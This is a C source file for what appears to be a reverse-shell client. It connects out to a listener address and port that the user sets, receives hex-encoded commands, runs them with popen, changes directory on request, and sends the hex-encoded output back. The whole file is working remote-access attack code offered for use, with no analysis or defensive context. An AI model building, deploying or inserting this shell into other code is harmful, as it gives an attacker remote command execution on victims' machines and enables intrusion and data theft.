#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

// Convert hex string to plain text
void hex_to_text(char *hex, char *output) {
    while (*hex && hex[1]) {
        sscanf(hex, "%2hhx", output);
        hex += 2;
        output++;
    }
    *output = '\0';
}

// Convert text to hex string
void text_to_hex(char *text, char *output) {
    while (*text) {
        sprintf(output, "%02x", (unsigned char)*text);
        text++;
        output += 2;
    }
    *output = '\0';
}

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[1024], command[1024], response[4096], encoded_response[8192];
    char current_directory[1024];

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("[-] Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Server details
    server.sin_family = AF_INET;
    server.sin_port = htons(8888); // Change this to your listener port
    server.sin_addr.s_addr = inet_addr("0.0.0.0"); // Change this to your listener IP

    // Connect to the listener
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("[-] Connection failed");
        exit(EXIT_FAILURE);
    }

    printf("[+] Connected to the listener\n");

    // Set initial working directory
    getcwd(current_directory, sizeof(current_directory));

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(command, 0, sizeof(command));
        memset(response, 0, sizeof(response));
        memset(encoded_response, 0, sizeof(encoded_response));

        // Receive hex-encoded command
        if (recv(sock, buffer, sizeof(buffer), 0) <= 0) {
            perror("[-] Connection closed");
            break;
        }

        hex_to_text(buffer, command); // Decode hex command

        // If exit command, terminate
        if (strcmp(command, "exit") == 0) {
            break;
        }

        // Handle 'cd' command manually
        if (strncmp(command, "cd ", 3) == 0) {
            char *new_dir = command + 3;
            if (chdir(new_dir) == 0) {
                getcwd(current_directory, sizeof(current_directory));
                snprintf(response, sizeof(response), "[+] Changed directory to: %s\n", current_directory);
            } else {
                snprintf(response, sizeof(response), "[-] Failed to change directory to: %s\n", new_dir);
            }
        } else {
            // Execute command in the correct directory
            FILE *fp = popen(command, "r");
            if (fp == NULL) {
                strcpy(response, "[-] Failed to execute command");
            } else {
                size_t len = 0;
                while (fgets(response + len, sizeof(response) - len, fp) != NULL) {
                    len = strlen(response);
                }
                pclose(fp);
            }
        }

        text_to_hex(response, encoded_response); // Convert output to hex
        send(sock, encoded_response, strlen(encoded_response), 0);
    }

    close(sock);
    return 0;
}
